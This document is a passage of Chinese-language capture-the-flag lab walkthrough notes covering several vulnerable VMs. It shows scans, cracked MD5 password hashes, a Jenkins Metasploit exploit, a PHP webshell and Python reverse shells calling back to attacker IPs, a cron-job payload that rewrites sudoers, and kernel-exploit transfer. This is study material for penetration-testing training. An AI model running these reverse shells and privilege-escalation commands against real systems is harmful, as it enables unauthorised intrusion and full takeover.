<li><p>全面的扫：sudo nmap –min-rate 10000  -p-  192.168.1.30<img src="https://api2.mubu.com/v3/document_image/24460aa6-3cc1-49bc-b10b-ca3e1d063731-18494357.jpg" alt="img"></p>
</li>
<li><p>sudo nmap -sT -sV -O -p22,80,3306,8080 192.168.1.30 （TCP）<img src="https://api2.mubu.com/v3/document_image/271e47c1-d865-4c73-bed1-174f348dc01f-18494357.jpg" alt="img"></p>
</li>
<li><p>sudo nmap -sU -sV -O -p22,80,3306,8080 192.168.1.30 （UDP）<img src="https://api2.mubu.com/v3/document_image/e1f93768-df56-4fd4-8ba9-baf8e8ad45e7-18494357.jpg" alt="img"></p>
</li>
<li><p>扫描漏洞：sudo nmap –script&#x3D;vuln -p22,80,3306,8080 192.168.1.30<img src="https://api2.mubu.com/v3/document_image/ebe9376e-7eec-40ff-bf55-af408cf9a039-18494357.jpg" alt="img"></p>
</li>
</ul>
</li>
<li><p>80端口web服务</p>
<ul>
<li><p>dirb 扫描dirb <a href="http://192.168.1.30/">http://192.168.1.30:80</a>   -X .html -o output.txt  (可以多试下看加不加.html)<img src="https://api2.mubu.com/v3/document_image/1b8ee47f-7a60-4979-b382-f8dd852407b9-18494357.jpg" alt="img"></p>
</li>
<li><p>访问access<img src="https://api2.mubu.com/v3/document_image/fac7740e-0279-49e8-9c15-63af5e4734a9-18494357.jpg" alt="img"></p>
</li>
<li><p>hash解密</p>
<ul>
<li><p>看类型（md5）<img src="https://api2.mubu.com/v3/document_image/4635c79e-b18f-4768-be95-8402052db235-18494357.jpg" alt="img"></p>
</li>
<li><p>解密</p>
<ul>
<li><p>tiago:5978a63b4654c73c60fa24f836386d87：italia99</p>
</li>
<li><p>trindade:f463f63616cb3f1e81ce46b39f882fd5：marianna</p>
</li>
<li><p>eder:9b38e2b1e8b12f426b0d208a7ab6cb98：vipsu</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>8080端口处理</p>
<ul>
<li><p>使用之前三组密码登录，最后一组可以<img src="https://api2.mubu.com/v3/document_image/939d0297-acfe-42a1-9a21-61839f2adf3f-18494357.jpg" alt="img"></p>
</li>
<li><p>jenkins尝试使用msf攻击<img src="https://api2.mubu.com/v3/document_image/b0650d15-a14f-410d-8e88-5e444e4ffcbf-18494357.jpg" alt="img"></p>
</li>
<li><p>use exploit&#x2F;multi&#x2F;http&#x2F;jenkins_script_console</p>
</li>
<li><p>show options（注意lport不要设成4444）<img src="https://api2.mubu.com/v3/document_image/cf0e5e49-a74e-4ab7-b332-523dd9eebafb-18494357.jpg" alt="img"></p>
</li>
<li><p>成功得到shell<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/38f69a88-a519-432d-a4be-458890219659-18494357.jpg" alt="img"></p>
</li>
</ul>
</li>
</ul>
<h2 id="sickos2"><a href="#sickos2" class="headerlink" title="sickos2"></a>sickos2</h2><ul>
<li><p>目标探测</p>
<ul>
<li><p>──(kali㉿kali)-[~&#x2F;Desktop]</p>
</li>
<li><p>└─$ sudo nmap  -sV -sT -O  -p22,80 192.168.0.105</p>
</li>
<li><p>Starting Nmap 7.93 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2023-02-06 22:49 EST</p>
</li>
<li><p>Nmap scan report for 192.168.0.105</p>
</li>
<li><p>Host is up (0.00025s latency).</p>
</li>
<li><p>PORT   STATE SERVICE VERSION</p>
</li>
<li><p>22&#x2F;tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)</p>
</li>
<li><p>80&#x2F;tcp open  http    lighttpd 1.4.28</p>
</li>
<li><p>MAC Address: 00:0C:29:9D:7F:28 (VMware)</p>
</li>
<li><p>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</p>
</li>
<li><p>Device type: general purpose</p>
</li>
<li><p>Running: Linux 3.X|4.X</p>
</li>
<li><p>OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</p>
</li>
<li><p>OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4</p>
</li>
<li><p>Network Distance: 1 hop</p>
</li>
<li><p>Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</p>
</li>
<li><p>OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .</p>
</li>
</ul>
</li>
<li><p>nikto</p>
<ul>
<li><p>┌──(kali㉿kali)-[~&#x2F;Desktop]</p>
</li>
<li><p>└─$ nikto -url 192.168.0.105                                                                                                                                                                                                                                                    1 ⨯</p>
</li>
<li><p>- Nikto v2.1.6</p>
</li>
<li><p>-————————————————————————–</p>
</li>
<li><p>+ Target IP:          192.168.0.105</p>
</li>
<li><p>+ Target Hostname:    192.168.0.105</p>
</li>
<li><p>+ Target Port:        80</p>
</li>
<li><p>+ Start Time:         2023-02-07 01:51:25 (GMT-5)</p>
</li>
<li><p>-————————————————————————–</p>
</li>
<li><p>+ Server: lighttpd&#x2F;1.4.28</p>
</li>
<li><p>+ The anti-clickjacking X-Frame-Options header is not present.</p>
</li>
<li><p>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</p>
</li>
<li><p>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</p>
</li>
<li><p>+ All CGI directories ‘found’, use ‘-C none’ to test none</p>
</li>
<li><p>+ Retrieved x-powered-by header: PHP&#x2F;5.3.10-1ubuntu3.21</p>
</li>
<li><p>+ 26545 requests: 0 error(s) and 4 item(s) reported on remote host</p>
</li>
<li><p>+ End Time:           2023-02-07 01:52:28 (GMT-5) (63 seconds)</p>
</li>
<li><p>-————————————————————————–</p>
</li>
<li><p>+ 1 host(s) tested</p>
</li>
</ul>
</li>
<li><p>dirb 扫描到  <a href="http://192.168.0.105/test/">http://192.168.0.105/test/</a> </p>
</li>
<li><p>whatweb</p>
<ul>
<li><p>┌──(kali㉿kali)-[~&#x2F;Desktop]</p>
</li>
<li><p>└─$ whatweb 192.168.0.105                                                                                                                                                                                                                                                     130 ⨯</p>
</li>
<li><p><a href="http://192.168.0.105/">http://192.168.0.105</a> [200 OK] Country[RESERVED][ZZ], HTTPServer[lighttpd&#x2F;1.4.28], IP[192.168.0.105], PHP[5.3.10-1ubuntu3.21], X-Powered-By[PHP&#x2F;5.3.10-1ubuntu3.21], lighttpd[1.4.28]</p>
</li>
</ul>
</li>
<li><p>nmap –script-help http-methods     </p>
</li>
<li><p>nmap –script http-methods –script-args http-methods.url-path&#x3D;’&#x2F;test’ 192.168.0.105</p>
</li>
<li><p>向对应目录PUT发现确实可以写文件</p>
<ul>
<li>例子<img src="https://api2.mubu.com/v3/document_image/70a922dc-e820-4b23-aa5d-a8afe464b7fc-18494357.jpg" alt="img"></li>
</ul>
</li>
<li><p>反弹shell</p>
<ul>
<li><p>php一句话，然后使用蚁剑连接<img src="https://api2.mubu.com/v3/document_image/d7f49224-c148-450b-8460-74cf27d38a0e-18494357.jpg" alt="img"></p>
</li>
<li><p>使用hackbar 得python reverse_shell 反弹</p>
<ul>
<li><p>python -c ‘import os,pty,socket;s&#x3D;socket.socket();s.connect((“192.168.0.107”,443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(“sh”)’</p>
</li>
<li><p>切换到交互式python  python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’<img src="https://api2.mubu.com/v3/document_image/36c1ba1c-191f-4957-be77-ac546591cb3e-18494357.jpg" alt="img"></p>
</li>
<li><p>另外：</p>
<ul>
<li><p>curl上传文件</p>
<ul>
<li><p>curl -v -T php-reverse-shell.php “<a href="http://192.168.30.208/test/">http://192.168.30.208/test/</a>“</p>
</li>
<li><h2 id="v-–verbose-输出详细内容"><a href="#v-–verbose-输出详细内容" class="headerlink" title="#-v, –verbose                  输出详细内容"></a>#-v, –verbose                  输出详细内容</h2><p>  -<br>- #-T, –upload-file FILE			后跟上传目标文件（Transfer）</p>
</li>
<li><p>#-H, –header      LINE         添加请求头, 可添加多个 -H 参数</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>提权</p>
<ul>
<li><p>whoami;pwd;uname -a</p>
</li>
<li><p>lsb_release -a</p>
<ul>
<li><p>www-data@ubuntu:&#x2F;tmp$ lsb_release -a</p>
</li>
<li><p>lsb_release -a</p>
</li>
<li><p>No LSB modules are available.</p>
</li>
<li><p>Distributor ID: Ubuntu</p>
</li>
<li><p>Description:    Ubuntu 12.04.4 LTS</p>
</li>
<li><p>Release:        12.04</p>
</li>
<li><p>Codename:       precise</p>
</li>
</ul>
</li>
<li><p>seachexploit 没找到</p>
</li>
<li><p>看定时任务</p>
</li>
<li><p>ls -la &#x2F;etc&#x2F;cron*</p>
</li>
<li><p>printf ‘#!&#x2F;bin&#x2F;bash\nbash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.137.150&#x2F;8080 0&gt;&amp;1\n’ &gt; &#x2F;tmp&#x2F;update</p>
</li>
<li><p>echo ‘chmod +w &#x2F;etc&#x2F;sudoers &amp;&amp; echo “www-data ALL&#x3D;(ALL)  NOPASSWD:ALL” &gt; &#x2F;etc&#x2F;sudoers’ &gt; &#x2F;tmp&#x2F;update<img src="https://api2.mubu.com/v3/document_image/5c80ac6e-ef16-4183-8724-bdbfe4eb023c-18494357.jpg" alt="img"></p>
</li>
<li><p>sudo &#x2F;bin&#x2F;bash</p>
</li>
<li><p>get</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="prime-1"><a href="#prime-1" class="headerlink" title="prime 1"></a>prime 1</h2><ul>
<li><p>自己慢慢测试</p>
<ul>
<li><p>得到靶机IP 192.168.0.109</p>
</li>
<li><p>nmap 扫描（TCP、UDP、–min-rate、–script）得到22、80开的</p>
</li>
<li><p>nikto访问web目录没找到明显漏洞</p>
</li>
<li><p>dirb 扫描一下web</p>
<ul>
<li><p>访问<a href="http://192.168.0.109/dev%EF%BC%8C%E6%B2%A1%E5%95%A5%E6%9C%89%E7%94%A8%E4%B8%9C%E8%A5%BF">http://192.168.0.109/dev，没啥有用东西</a></p>
</li>
<li><p>dirb <a href="http://192.168.0.109/">http://192.168.0.109</a> -X .txt,.php,.html    找到secret.txt</p>
<ul>
<li><p>Looks like you have got some secrets.</p>
</li>
<li><p>Ok I just want to do some help to you. </p>
</li>
<li><p>Do some more fuzz on every page of php which was finded by you. And if</p>
</li>
<li><p>you get any right parameter then follow the below steps. If you still stuck </p>
</li>
<li><p>Learn from here a basic tool with good usage for OSCP.</p>
</li>
<li><p><a href="https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web">https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web</a></p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>wfuzz -w &#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt   <a href="http://192.168.0.109/index.php?FUZZ">http://192.168.0.109/index.php?FUZZ</a></p>
</li>
<li><p>wfuzz -c -w &#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt  –hc 404 –hw 12  <a href="http://192.168.0.109/index.php?FUZZ">http://192.168.0.109/index.php?FUZZ</a></p>
</li>
<li><p>然后得到进一步信息<img src="https://api2.mubu.com/v3/document_image/2ae0ad8b-8f04-4551-a6bb-e9a3a8af50ff-18494357.jpg" alt="img"></p>
</li>
<li><p>发现可以文件读取：<a href="http://192.168.0.109/image.php?file=location.txt&secrettier360=/etc/passwd">http://192.168.0.109/image.php?file=location.txt&amp;secrettier360=/etc/passwd</a> ，saket:x:1001:1001:find password.txt file in my directory:&#x2F;home&#x2F;saket:</p>
</li>
<li><p>访问 &#x2F;home&#x2F;saket&#x2F;password.txt,得到victor密码，进入wordpress管理界面</p>
</li>
<li><p><a href="http://192.168.0.109/wordpress/wp-admin/index.php">http://192.168.0.109/wordpress/wp-admin/index.php</a></p>
</li>
<li><p>编辑一个界面：<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.229.128/1234 0>&1'"); ?></p>
</li>
<li><p>访问<img src="https://api2.mubu.com/v3/document_image/528c58e1-5263-4eb4-ae71-af44a8627176-18494357.jpg" alt="img"></p>
</li>
<li><p>whoami，uname -a，lsb-release，cat &#x2F;etc&#x2F;cron*</p>
</li>
<li><p>内核提权：searchsploit ubuntu 4.10 | grep “Pri” </p>
</li>
<li><p>找个c文件编译</p>
</li>
<li><p>python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
</li>
<li><p>上传文件</p>
<ul>
<li><p>nc上传</p>
<ul>
<li><p>www-data：nc -lp 4444 &gt; 45010.c</p>
</li>
<li><p>发送端：nc 192.168.0.109 4444  &lt; 45010.c</p>
</li>
<li><p>成功<img src="https://api2.mubu.com/v3/document_image/399f870a-9404-4e31-bb1b-e95c40014fc7-18494357.jpg" alt="img"></p>
</li>
</ul>
</li>
<li><p>开php服务上传</p>
<ul>
<li><p>php  -S  host:port  -t &#x2F;www,php -S 0:1234 -t  phpserver  </p>
</li>
<li><p>wget <a href="http://192.168.0.107:1234/45010.c">http://192.168.0.107:1234/45010.c</a></p>
</li>
<li><p>ok</p>
</li>
<li></li>
</ul>
</li>
<li><p>metasploit 直接upload</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="prime2"><a href="#prime2" class="headerlink" title="prime2"></a>prime2</h2><ul>
<li><p>主机探测信息收集</p>
<ul>
<li><p>ip a，namp -sn 192.168.1.0&#x2F;24，nmap –min-rate 10000 192.168.1.40  ,sudo nmap -sT  -sV -O  192.168.1.40 ,sudo nmap -sU -sV -O  192.168.1.40 </p>
<ul>
<li><p>PORT    STATE SERVICE     VERSION</p>
</li>
<li><p>22&#x2F;tcp  open  ssh         OpenSSH 8.4p1 Ubuntu 5ubuntu1 (Ubuntu Linux; protocol 2.0)</p>
</li>
<li><p>80&#x2F;tcp  open  http        Apache httpd 2.4.46 ((Ubuntu))</p>
</li>
<li><p>139&#x2F;tcp open  netbios-ssn Samba smbd 4.6.2</p>
</li>
<li><p>445&#x2F;tcp open  netbios-ssn Samba smbd 4.6.2</p>
</li>
<li><p>10123</p>
</li>
<li><p>MAC Address: 00:0C:29:25:DB:31 (VMware)</p>
</li>
<li><p>Device type: general purpose</p>
</li>
<li><p>Running: Linux 4.X|5.X</p>
</li>
<li><p>OS CPE: cpe:&#x2F;o:linux:linux_kernel:4 cpe:&#x2F;o:linux:linux_kernel:5</p>
</li>
<li><p>OS details: Linux 4.15 - 5.6</p>
</li>
<li><p>Network Distance: 1 hop</p>
</li>
<li><p>Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</p>
</li>
</ul>
</li>
<li><p>nmap –script&#x3D;vuln -p 22,80,139,445 192.168.1.40  </p>
<ul>
<li><p>┌──(kali㉿kali)-[~&#x2F;Desktop]</p>
</li>
<li><p>└─$ nmap –script&#x3D;vuln -p 22,80,139,445 192.168.1.40                                                                                                                                                                                                                                      130 ⨯</p>
</li>
<li><p>Starting Nmap 7.93 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2023-02-07 20:56 EST</p>
</li>
<li><p>Stats: 0:00:31 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan</p>
</li>
<li><p>NSE Timing: About 50.00% done; ETC: 20:58 (0:00:32 remaining)</p>
</li>
<li><p>Pre-scan script results:</p>
</li>
<li><p>| broadcast-avahi-dos: </p>
</li>
<li><p>|   Discovered hosts:</p>
</li>
<li><p>|     224.0.0.251</p>
</li>
<li><p>|   After NULL UDP avahi packet DoS (CVE-2011-1002).</p>
</li>
<li><p>|_  Hosts are all up (not vulnerable).</p>
</li>
<li><p>Nmap scan report for 192.168.1.40</p>
</li>
<li><p>Host is up (0.00035s latency).</p>
</li>
<li><p>PORT    STATE SERVICE</p>
</li>
<li><p>22&#x2F;tcp  open  ssh</p>
</li>
<li><p>80&#x2F;tcp  open  http</p>
</li>
<li><p>| http-enum: </p>
</li>
<li><p>|   &#x2F;css&#x2F;: Potentially interesting directory w&#x2F; listing on ‘apache&#x2F;2.4.46 (ubuntu)’</p>
</li>
<li><p>|   &#x2F;images&#x2F;: Potentially interesting directory w&#x2F; listing on ‘apache&#x2F;2.4.46 (ubuntu)’</p>
</li>
<li><p>|_  &#x2F;server&#x2F;: Potentially interesting directory w&#x2F; listing on ‘apache&#x2F;2.4.46 (ubuntu)’</p>
</li>
<li><p>|_http-csrf: Couldn’t find any CSRF vulnerabilities.</p>
</li>
<li><p>|_http-stored-xss: Couldn’t find any stored XSS vulnerabilities.</p>
</li>
<li><p>|_http-dombased-xss: Couldn’t find any DOM based XSS.</p>
</li>
<li><p>139&#x2F;tcp open  netbios-ssn</p>
</li>
<li><p>445&#x2F;tcp open  microsoft-ds</p>
</li>
<li><p>10123</p>
</li>
<li><p>Host script results:</p>
</li>
<li><p>|_smb-vuln-ms10-054: false</p>
</li>
<li><p>|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [9]</p>
</li>
<li><p>|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [9]</p>
</li>
<li><p>Nmap done: 1 IP address (1 host up) scanned in 66.34 seconds</p>
</li>
</ul>
</li>
<li><p>端口探测：</p>
<ul>
<li><p>80端口：</p>
<ul>
<li><p>nikto -url <a href="http://192.168.1.40/">http://192.168.1.40</a></p>
<ul>
<li><p>- Nikto v2.1.6</p>
</li>
<li><p>-————————————————————————–</p>
</li>
<li><p>+ Target IP:          192.168.1.40</p>
</li>
<li><p>+ Target Hostname:    192.168.1.40</p>
</li>
<li><p>+ Target Port:        80</p>
</li>
<li><p>+ Start Time:         2023-02-07 21:01:32 (GMT-5)</p>
</li>
<li><p>-————————————————————————–</p>
</li>
<li><p>+ Server: Apache&#x2F;2.4.46 (Ubuntu)</p>
</li>
<li><p>+ The anti-clickjacking X-Frame-Options header is not present.</p>
</li>
<li><p>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</p>
</li>
<li><p>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</p>
</li>
<li><p>+ No CGI Directories found (use ‘-C all’ to force check all possible dirs)</p>
</li>
<li><p>+ Server may leak inodes via ETags, header found with file &#x2F;, inode: 1681, size: 5c1cb40b7dd57, mtime: gzip</p>
</li>
<li><p>+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS </p>
</li>
<li><p>+ OSVDB-3268: &#x2F;server&#x2F;: Directory indexing found.</p>
</li>
<li><p>+ &#x2F;server&#x2F;: Possibly Macromedia JRun or CRX WebDAV upload</p>
</li>
<li><p>+ OSVDB-3268: &#x2F;css&#x2F;: Directory indexing found.</p>
</li>
<li><p>+ OSVDB-3092: &#x2F;css&#x2F;: This might be interesting…</p>
</li>
<li><p>+ OSVDB-3268: &#x2F;images&#x2F;: Directory indexing found.</p>
</li>
<li><p>+ 7916 requests: 0 error(s) and 10 item(s) reported on remote host</p>
</li>
<li><p>+ End Time:           2023-02-07 21:02:23 (GMT-5) (51 seconds)</p>
</li>
</ul>
</li>
<li><p>访问&#x2F;server，看到文件下载下来之后在分析<img src="https://api2.mubu.com/v3/document_image/3018fe38-5ae7-4baf-84c8-b2f9f9e8c785-18494357.jpg" alt="img"></p>
</li>
<li><p>wpscan –url 192.168.1.40&#x2F;wp -e    </p>
<ul>
<li>得到admin</li>
</ul>
</li>
</ul>
</li>
<li><p>10123：</p>
<ul>
<li><p>wget下载目录文件：wget -r -np -nH -R index.html <a href="http://url/including/files/you/want/to/download/">http://url/including/files/you/want/to/download/</a></p>
</li>
<li><p>发现一个shell文件，盲猜之后要利用</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="lampCTF4"><a href="#lampCTF4" class="headerlink" title="lampCTF4"></a>lampCTF4</h2><h3 id="自己："><a href="#自己：" class="headerlink" title="自己："></a>自己：</h3><p>得到目标IP</p>
<p>访问web服务</p>
<p>访问blog：<a href="http://192.168.222.142/index.html?page=blog&title=Blog&id=2">http://192.168.222.142/index.html?page=blog&amp;title=Blog&amp;id=2</a></p>
<p>看到id&#x3D;2，怀疑有sql注入，输入引号，还真有，sqlmap能一把梭</p>
<p>得到用户名密码。</p>
<p>ssh：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ ssh 192.168.222.142                                                              </span><br><span class="line">Unable to negotiate with 192.168.222.142 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1</span><br><span class="line"></span><br><span class="line">问下gpt，还挺厉害</span><br><span class="line">怎样解决：ssh 192.168.222.142                                                              </span><br><span class="line">Unable to negotiate with 192.168.222.142 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1</span><br><span class="line">这个问题是由于你的SSH客户端和远程服务器在密钥交换方法上不匹配。目前，远程服务器提供的密钥交换方法包括 diffie-hellman-group-exchange-sha1、diffie-hellman-group14-sha1 和 diffie-hellman-group1-sha1。这些方法可能已被视为不安全或已被弃用。</span><br><span class="line">为了解决这个问题，你可以尝试以下几种方法：</span><br><span class="line">更新你的SSH客户端到最新版本。这样，你的客户端可能会支持更安全的密钥交换方法。在Linux或macOS系统上，你可以通过运行以下命令来更新：</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br><span class="line">在macOS上，如果你使用Homebrew安装了OpenSSH，可以运行：</span><br><span class="line">brew update</span><br><span class="line">brew upgrade openssh</span><br><span class="line">如果你无法更新SSH客户端，或者更新后仍然出现问题，你可以尝试临时修改SSH客户端配置以接受远程服务器提供的密钥交换方法。在命令行中运行以下命令：</span><br><span class="line">ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 user@192.168.222.142</span><br><span class="line">这将允许SSH客户端在本次会话中使用这些方法。请注意，这可能会降低安全性。</span><br><span class="line">另一种解决方案是更新远程服务器的SSH服务器配置，以支持更安全的密钥交换方法。这需要在服务器上编辑/etc/ssh/sshd_config文件，并添加或修改以下行：</span><br><span class="line">KexAlgorithms curve25519-sha256@libssh.org,ecdh-sha2-nistp521,ecdh-sha2-nistp384,ecdh-sha2-nistp256,diffie-hellman-group-exchange-sha256</span><br><span class="line">保存文件后，重启SSH服务器：</span><br><span class="line">sudo systemctl restart ssh</span><br><span class="line">这样，远程服务器将支持更安全的密钥交换方法。请确保在尝试此方法之前，你有远程服务器的管理员权限。</span><br><span class="line"></span><br><span class="line">ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 dstevens@192.168.222.142</span><br><span class="line">Unable to negotiate with 192.168.222.142 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss</span><br><span class="line">回答：</span><br><span class="line">这个问题是因为SSH客户端与远程服务器在主机密钥类型上不匹配。目前，远程服务器提供的主机密钥类型包括ssh-rsa和ssh-dss，这些类型可能已被视为不安全或已被弃用。</span><br><span class="line"></span><br><span class="line">要解决此问题，你可以尝试以下方法：</span><br><span class="line">临时修改SSH客户端配置以接受远程服务器提供的主机密钥类型。在命令行中运行以下命令：</span><br><span class="line">ssh -oHostKeyAlgorithms=+ssh-rsa,ssh-dss user@192.168.222.142</span><br><span class="line">这将允许SSH客户端在本次会话中使用这些主机密钥类型。请注意，这可能会降低安全性。</span><br><span class="line"></span><br><span class="line">更新远程服务器的SSH服务器配置以支持更安全的主机密钥类型。这需要在服务器上编辑/etc/ssh/sshd_config文件，并添加或修改以下行：</span><br><span class="line">HostKeyAlgorithms ssh-ed25519,ssh-rsa,ssh-dss</span><br><span class="line">同时，请确保在/etc/ssh/目录下生成对应的新主机密钥（如果尚未生成）：</span><br><span class="line"></span><br><span class="line">sudo ssh-keygen -t ed25519 -f /etc/ssh/ssh_host_ed25519_key -N &#x27;&#x27;</span><br><span class="line">保存文件后，重启SSH服务器：</span><br><span class="line"></span><br><span class="line">sudo systemctl restart ssh</span><br><span class="line">这样，远程服务器将支持更安全的主机密钥类型。请确保在尝试此方法之前，你有远程服务器的管理员权限。</span><br><span class="line">如果以上方法都无法解决问题，你可以考虑更新你的SSH客户端到最新版本，以支持更安全的主机密钥类型。请参考之前的回答中关于如何更新SSH客户端的说明。</span><br></pre></td></tr></table></figure>

<p>解决：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1  -oHostKeyAlgorithms=+ssh-rsa,ssh-dss  dstevens@192.168.222.142</span><br><span class="line">The authenticity of host &#x27;192.168.222.142 (192.168.222.142)&#x27; can&#x27;t be established.</span><br><span class="line">RSA key fingerprint is SHA256:NDWh6/414mOsW4P7K6ICc5R67PrX87ADMFUx9DK9ftk.</span><br><span class="line">This key is not known by any other names.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;192.168.222.142&#x27; (RSA) to the list of known hosts.</span><br><span class="line">BSD SSH 4.1</span><br><span class="line">dstevens@192.168.222.142&#x27;s password: </span><br><span class="line">Last login: Wed Mar 11 09:45:34 2009</span><br><span class="line">[dstevens@ctf4 ~]$ ftp</span><br><span class="line">ftp&gt; !ls</span><br><span class="line">Desktop  html  install.log  mail  software</span><br><span class="line">ftp&gt; !whoami</span><br><span class="line">dstevens</span><br><span class="line">ftp&gt; !/bin/bash</span><br><span class="line">[dstevens@ctf4 ~]$ sudo ftp</span><br><span class="line">Password:</span><br><span class="line">ftp&gt; !whoami</span><br><span class="line">root</span><br><span class="line">ftp&gt; </span><br></pre></td></tr></table></figure>

<p>这个是遇到的最简单的了，主要难度还是ssh登录的配置</p>
<h2 id="lampCTF5"><a href="#lampCTF5" class="headerlink" title="lampCTF5"></a>lampCTF5</h2><p>扫描发现服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sudo nmap -sN -sV -O   -p22,25,80,110,111,139,143,445,901,3306  192.168.222.143</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-12 08:55 EDT</span><br><span class="line">Nmap scan report for 192.168.222.143</span><br><span class="line">Host is up (0.00031s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 4.7 (protocol 2.0)</span><br><span class="line">25/tcp   open  smtp        Sendmail 8.14.1/8.14.1</span><br><span class="line">80/tcp   open  http        Apache httpd 2.2.6 ((Fedora))</span><br><span class="line">110/tcp  open  pop3        ipop3d 2006k.101</span><br><span class="line">111/tcp  open  rpcbind     2-4 (RPC #100000)</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)</span><br><span class="line">143/tcp  open  imap        University of Washington IMAP imapd 2006k.396 (time zone: -0400)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)</span><br><span class="line">901/tcp  open  http        Samba SWAT administration server</span><br><span class="line">3306/tcp open  mysql       MySQL 5.0.45</span><br><span class="line">MAC Address: 00:0C:29:DC:88:B2 (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.9 - 2.6.30</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Hosts: localhost.localdomain, 192.168.222.143; OS: Unix</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 14.45 seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sudo nmap --script=vuln -p22,25,80,110,111,139,143,445,901,3306  192.168.222.138</span><br><span class="line">[sudo] password for kali: </span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-12 08:12 EDT</span><br><span class="line">Pre-scan script results:</span><br><span class="line">| broadcast-avahi-dos: </span><br><span class="line">|   Discovered hosts:</span><br><span class="line">|     224.0.0.251</span><br><span class="line">|   After NULL UDP avahi packet DoS (CVE-2011-1002).</span><br><span class="line">|_  Hosts are all up (not vulnerable).</span><br><span class="line">Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn</span><br><span class="line">Nmap done: 1 IP address (0 hosts up) scanned in 35.81 seconds</span><br></pre></td></tr></table></figure>

<p>信息收集：</p>
<p>22试下能ssh爆破不（一般不太行，ladon跑，干其他事情）</p>
